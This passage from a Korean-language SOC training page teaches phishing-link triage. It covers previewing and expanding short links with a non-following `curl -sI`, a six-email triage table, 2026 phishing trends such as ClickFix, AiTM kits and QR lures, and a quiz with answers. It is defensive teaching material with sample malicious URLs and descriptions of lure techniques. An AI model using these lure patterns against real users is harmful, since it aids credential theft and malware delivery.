| TinyURL | 하위 도메인으로 `preview.` 붙이기: `preview.tinyurl.com/<코드>` | |
| is.gd | 끝에 `-` 붙이기 | 오래전부터 알려진 방법. 기대기 전에 확인할 것 |
| tiny.cc | 끝에 `~` 붙이기 | 위와 같음 |

단축 서비스는 이런 기능을 수시로 바꾸니까, 조사에 쓰기 전에 직접 만든 링크로 시험해 보세요.

**방법 2: 펼치기 서비스.** 서드파티 "단축 풀기" 서비스가 대신 리디렉트를 따라가 주고, 목적지 스크린숏까지 찍어 주는 곳도 있습니다. 편하지만 바깥 업체입니다. 링크를 보게 되고, 무엇을 조회했는지 공개하는 곳도 있습니다(아래 [주의] 상자 참고).

**방법 3: 분석용 머신에서 헤더만 받는 요청.** 따라가지 않고, 단축 서비스에 어디로 보낼 건지만 묻습니다.

```
curl -sI https://lnk.example/Pq7Rz
```

- `curl` — 명령줄 HTTP 클라이언트.
- `-s` — 조용히(진행 막대 없음).
- `-I` — `HEAD` 요청을 보내고 응답 헤더만 출력.
- `-L` 없음 — 그래서 curl이 리디렉트를 **따라가지 않습니다**. 단축 서비스하고만 이야기하고, 목적지에는 절대 안 갑니다.

출력:

```
HTTP/2 301
date: Fri, 27 Nov 2026 08:05:12 GMT
location: https://hr-docs-sign.example/policy/view?uid=l.ward
content-length: 0
```

- `HTTP/2 301` — "영구 이동", 즉 리디렉트.
- `location:` — **답**. 진짜 목적지는 `hr-docs-sign.example`이고, 경로에 받는 사람의 사용자 이름이 들어 있습니다. 이것도 수신자별 링크입니다.
- `content-length: 0` — 페이지 본문 없음. 단축 서비스는 리디렉트만 합니다.

이제 `hr-docs-sign.example`을 여느 링크처럼 확인합니다. 나이, 평판, 호스팅, 무엇을 내주는지(샌드박스 브라우저나 비공개로 설정한 스캔 서비스로). **[주의]** 헤더 요청도 단축 서비스에는 닿고, 어떤 피싱 인프라는 방문 IP를 기록하거나 반복 방문자를 막습니다. 우리 조직으로 추적되지 않는 분석 환경에서 하세요. 방법은 뒤의 분석 OPSEC 섹션에서 다룹니다.

## 아침 대기열 분류 결과 { #queue-result }

| # | 방식 | 수법 | 핵심 증거 | 판정과 다음 단계 |
| --- | --- | --- | --- | --- |
| E1 | 링크 | 글자 ≠ 목적지, 남의 도메인 안의 브랜드 | `payslip-bluegum.example`로 가는 `href` | 악성. 도메인 차단, 프록시에서 클릭 검색 |
| E2 | 링크 | IDN 닮은꼴 | 퓨니코드 `xn--bluegum-fright-9vl` | 악성, 표적형일 가능성(브랜드 맞춤 도메인). 상향 보고 |
| E3 | 링크 | 닮은꼴 하위 도메인 + 복제 로그인 | 등록 도메인 `mailbox-quota.example`, 폼이 `post.php`로 전송 | 자격 증명 피싱. 폼 제출 여부 확인 |
| E4 | 링크 | 오픈 리디렉트 | `dest=`를 풀면 사흘 된 도메인 | 악성. 협력사 말고 목적지 차단, 협력사에 알림 |
| E5 | 링크 → 파일 | 좋은 사이트, 나쁜 내용 | 프록시 다운로드 + EDR `wscript` → `powershell` | **사고.** BG-WS-0641 격리 |
| E6 | 링크 | 단축 링크 | `hr-docs-sign.example`로 가는 `location:`, 경로에 사용자 이름 | 악성, 수신자별. 클릭 확인 |

모든 건에서 헤더를 먼저 봤다는 점(E1과 E3는 우리 도메인에 대해 DMARC 실패, E2는 *그 도메인* 기준으로 SPF·DKIM이 유효한 갓 만든 닮은꼴 도메인에서 옴), 그리고 E5는 네트워크만으로 끝낼 수 없었다는 점을 눈여겨보세요.

## 2026년 관점 { #trends }

!!! success "[2026 현재] 지금도 그대로 유효"
    이메일 공격 방식 네 가지는 모두 지금도 쓰이고, 링크는 여전히 가장 흔한 피싱 페이로드입니다. 헤더부터 읽기, `href`와 퓨니코드 풀기, 등록 도메인 찾기, 리디렉트 벗기기, "해킹당함 대 처음부터 나쁨" 판단하기, 피해자 사이트 차단에 만료일 달기, 목적지에 가지 않고 단축 링크 펼치기는 모두 표준 업무입니다. 믿을 만한 클라우드 서비스 악용은 이 기법들이 처음 정리될 때보다 오히려 더 흔해졌습니다.

!!! info "[변경됨] 바뀐 점"
    - **매크로는 더 이상 주력 첨부 파일이 아니다.** 2022년부터 Office가 인터넷에서 온 파일의 매크로를 기본으로 막으면서, 공격자는 컨테이너(ISO, IMG), 바로 가기 파일(LNK), HTML 스머글링, OneNote와 PDF 미끼로 옮겨 갔고, 그다음엔 첨부 파일 자체를 떠나 링크, 그림이나 PDF 속 **QR 코드**(피해자를 관리되지 않는 휴대폰으로 끌어냄), 그리고 사용자가 실행 창에 명령을 붙여 넣게 만드는 "ClickFix" 페이지로 갔습니다(ATT&CK이 T1204.004 User Execution: Malicious Copy and Paste를 추가).
    - **복제 페이지가 실시간 프록시가 됐다.** 중간자(AiTM, Adversary-in-the-Middle) 피싱 키트는 진짜 로그인 페이지를 중계하면서 MFA 뒤에 발급되는 세션 쿠키를 훔칩니다(T1557 Adversary-in-the-Middle, T1539 Steal Web Session Cookie). 페이지가 "완벽한" 건 정말로 진짜 페이지를 통과시켜 보여 주기 때문이니, 주소창의 호스트가 그 어느 때보다 중요합니다.
    - **AI가 쓴 피싱.** 생성형 AI가 예전에 쉬운 단서였던 맞춤법 실수와 어색한 문장을 없앴고, 사람마다·언어마다 미끼를 맞추는 비용을 낮췄습니다. 글솜씨가 아니라 헤더, 도메인, 인프라, 행동으로 판단하세요.
    - **단축 서비스가 바뀌었다.** Bitly는 클릭 수를 더는 공개하지 않습니다(링크 주인에게만 보임). 무료 Bitly 링크에는 광고가 들어갈 수 있는 미리 보기 페이지가 뜰 수 있습니다. Google은 2025년 8월에 goo.gl 단축 서비스를 껐습니다(나중에 아직 활발히 쓰이는 링크는 계속 동작하게 두겠다고 했습니다). 공격자는 공개 단축 서비스 대신 믿을 만한 플랫폼 자체의 리디렉터로 단축하기도 합니다.
    - **이메일 인증이 더 넓게 강제된다.** 큰 메일함 업체들이 대량 발송자에게 SPF, DKIM, DMARC를 요구하면서, 보호된 도메인을 대놓고 위조하는 건 더 자주 막힙니다. 그래서 공격자는 닮은꼴 도메인, 뚫린 진짜 계정, 인증을 통과하는 정상 SaaS 플랫폼을 통한 발송에 기댑니다.
    - **메일 프로그램 "제로 클릭" 버그**는 여전히 드물지만 나옵니다. 예를 들어 알림, 일정 항목, 미리 보기를 처리하는 부분에서. 이런 권고는 급한 패치로 다루세요.
    - **이 페이지에서 쓴 ATT&CK ID:** T1566.001, T1566.002, T1598.003, T1027.013, T1204.002, T1204.004, T1059.007, T1105, T1583.001, T1584.001, T1584.004, T1608.001, T1608.005, T1557, T1539. ATT&CK v19(2026년 4월)에서 일부 회피 기법의 전술 배치가 바뀌었지만, 위 ID들은 그대로입니다.

!!! warning "[주의] 옛 방식대로 하면 틀리거나 위험한 점"
    - **"어떻게 되나 보려고" 누르지 마세요.** "확인만 하려고" 내 업무 PC에서 누르는 것도 안 됩니다. 미리 보기, 헤더만 받는 요청, 비공개 샌드박스 스캔, 격리된 분석용 머신을 쓰세요.
    - **공개 스캔 서비스는 경우에 따라 기본값이 공개다.** 예를 들어 urlscan.io는 공개(public), 비목록(unlisted), 비공개(private) 스캔을 고를 수 있습니다. 수신자별 URL(E1의 `?id=`나 E3의 미리 채운 주소)을 공개로 스캔하면 직원의 이메일 주소가 새어 나가고, 공격자에게 우리가 들여다보고 있다고 알려 줄 수 있습니다. 개인 매개변수는 지우고 비공개 스캔을 고르세요.
    - **"유효한 인증서"와 "좋은 평판"은 판정이 아니다.** 피싱 사이트 대부분에 무료 인증서가 있고, 해킹당한 사이트나 믿을 만한 사이트는 당연히 평판이 좋습니다.
    - **공유 파일 하나가 악성이었다고 믿을 만한 서비스의 도메인 전체를 막지 마세요.** 그 링크만 막고 업체에 신고하세요.
    - **오늘 깨끗하게 스캔됐다고 어제의 클릭이 무혐의가 되지는 않는다.** 피싱 페이지는 꺼지고, 청소되고, 지역에 따라 다르게 보입니다. 과거 스냅숏과 클릭 당시 우리 로그를 쓰세요.

## 확인 문제 { #quiz }

### 문제 1

사용자가 비밀번호 걸린 `.zip` 첨부 파일이 있는 메일을 신고했고, 비밀번호는 본문에 적혀 있습니다. 게이트웨이 로그에는 "암호화된 압축 — 검사 안 함 — 배달함"이라고 남았습니다. 공격자가 이 방식을 쓰는 이유, 실행하지 않고 안에 뭐가 있는지 안전하게 보는 방법, 그리고 `Statement.pdf.js`라는 파일 이름이 말해 주는 것을 설명하세요.

??? success "정답과 해설"
    필터는 복호화할 수 없는 건 검사할 수 없고, 자유롭게 쓴 글 속 비밀번호를 찾아 쓰는 건 자동화하기 어렵습니다. 그래서 장비는 포기하고 배달하고, 사람은 비밀번호를 읽고 페이로드를 꺼냅니다. 파일 형식 차단(겉 파일은 그냥 zip)과 내용 검사를 둘 다 이기는 방식이죠.

    격리된 분석용 머신에서, 풀지 말고 **나열**하세요. `7z l -p<비밀번호> archive.zip`은 이름, 크기, 날짜를 보여 줍니다. 그다음 안전한 폴더에 풀어서 더블클릭하지 않고 해시를 구하거나 정적으로 살펴볼 수 있습니다.

    `Statement.pdf.js`는 이중 확장자로 위장한 **JavaScript 파일**입니다. Windows는 기본으로 알려진 확장자를 숨기니까 사용자 눈에는 `Statement.pdf`로 보이고, 더블클릭하면 Windows Script Host에서 실행됩니다. 문서가 아니라 스크립트 드로퍼입니다(배달 T1566.001, 열면 실행 T1204.002, T1059.007 JavaScript).

### 문제 2

각 링크를 수법으로 분류하고 실제로 차단할 도메인을 말하세요. (a) `https://secure.bluegumfreight.example.account-check.example/login`, (b) `https://www.big-search.example/url?q=https%3A%2F%2Fpay-update.example%2F`, (c) `https://xn--bluegumfreght-dil.example/`, (d) `https://www.oldhardware.example/wp-content/uploads/2026/10/inv/view.php`.

??? success "정답과 해설"
    (a) **닮은꼴 하위 도메인.** 오른쪽에서 왼쪽으로 읽으면 등록 도메인은 `account-check.example`이고, 그 앞은 전부 공격자의 하위 도메인입니다. `account-check.example`을 차단합니다.

    (b) 평판 좋은 사이트의 **오픈 리디렉트**. `%3A%2F%2F`를 풀면 `https://pay-update.example/`. 검색 사이트가 아니라 `pay-update.example`을 차단합니다.

    (c) **IDN 닮은꼴.** `xn--` 접두사는 퓨니코드라는 뜻이고, 풀면 `bluegumfreight`처럼 보이게 만든 유니코드 이름이 나올 겁니다. 그 퓨니코드 도메인을 정확히 차단하고(같은 때 등록된 형제 도메인도 찾아보세요).

    (d) **해킹당한 사이트.** 오래된 작은 업체 도메인의 WordPress 업로드 폴더에 PHP 파일. **그 경로만** 막거나(또는 만료일을 단 도메인 차단), 시각을 기록하고, 주인에게 알리는 걸 고려합니다. 공격자 인프라가 아니라 피해자니까요.

### 문제 3

동료가 단축 링크를 무료 "단축 풀기 + 스크린숏" 사이트에 붙여 넣어 펼쳐 보고는 "스크린숏에 평범한 페이지가 나오니까 괜찮아"라고 했습니다. 이 방법의 문제 두 가지를 들고, 더 안전한 방법과 그 출력에서 무엇을 읽을지 설명하세요.

??? success "정답과 해설"
    문제: (1) 이제 바깥 서비스가 그 링크를 갖고 있고, 조회 내용을 공개하는 곳도 있습니다. 수신자별 링크라면 직원이 드러나고, SOC가 조사 중이라는 걸 공격자에게 알려 줄 수 있습니다. (2) 스크린숏은 *그 서비스*가 *그 위치*에서 *그 순간* 받은 화면일 뿐입니다. 피싱 페이지는 지역이나 IP, 사용자 에이전트로 걸러 보여 주거나 잠깐만 켜 두는 경우가 많아서, "지금 평범함"이 "사용자가 누를 때 평범했음"을 뜻하지 않습니다. 스크린숏은 폼이 무엇을 하는지도 말해 주지 않고요.

    더 안전한 방법: 단축 서비스 자체의 미리 보기(Bitly는 `+`, TinyURL은 `preview.`)를 쓰거나, 추적되지 않는 분석용 머신에서 `-L` **없이** `curl -sI <단축 링크>`를 돌립니다. 상태 줄(`301`/`302` = 리디렉트)과 **`location:`** 헤더를 읽으면 그게 진짜 목적지입니다. 그다음 그 목적지의 나이, 평판, 호스팅을 확인하고, 누가 눌렀는지 보려면 우리 프록시 로그에서 단축 URL과 펼친 URL을 둘 다 검색합니다(다음 페이지).
